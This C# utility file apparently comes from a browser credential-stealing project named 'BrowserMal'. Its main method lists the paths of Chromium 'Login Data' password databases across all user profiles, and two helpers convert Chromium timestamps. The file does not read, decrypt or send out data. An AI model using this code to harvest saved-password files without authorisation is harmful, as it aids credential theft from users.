using System;
using System.Collections.Generic;
using System.IO;

namespace BrowserMal.Browser
{
    public class Util
    {
		public static List<string> GetAllProfiles(string DirectoryPath)
		{
			List<string> list = new List<string>
			{
				DirectoryPath + "\\Default\\Login Data",
				DirectoryPath + "\\Login Data"
			};

			if (Directory.Exists(DirectoryPath))
			{
				foreach (string profile in Directory.GetDirectories(DirectoryPath))
				{
					if (profile.Contains("Profile"))
					{
						list.Add(profile + "\\Login Data");
					}
				}
			}

			return list;
		}

		public static string ChromiumToUnixTimestamp(long chromiumTimestamp)
        {
			DateTime dateChromium = new DateTime(1601, 1, 1);
			DateTime dateUnix = new DateTime(1970, 1, 1);

			TimeSpan difference = dateUnix.Subtract(dateChromium);
			double resolvedTimestamp = (chromiumTimestamp / 1000000) - difference.TotalSeconds;

			return resolvedTimestamp.ToString();
		}

		public static DateTime GetDateTimeFromTimestamp(string timestamp)
        {
			return DateTimeOffset.FromUnixTimeSeconds(Convert.ToInt64(timestamp)).DateTime;
		}

	}
}
